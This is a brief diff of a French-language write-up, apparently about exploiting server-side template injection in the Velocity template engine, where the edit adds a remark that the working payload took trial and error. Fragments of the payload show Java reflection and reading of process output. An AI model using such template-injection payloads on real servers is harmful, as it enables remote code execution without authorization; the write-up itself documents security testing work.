@@ -19,7 +19,7 @@ $str.valueOf($chr.toChars($out.read()))
 #end
 ```
 
-`Payload` adapté et fonctionnel :
+`Payload` adapté et fonctionnel (assez fastidieux, il a fallu y aller à tâtons et essayer des choses..) :
 
 ```
 #set($str=$name.getClass().forName("java.lang.String"))
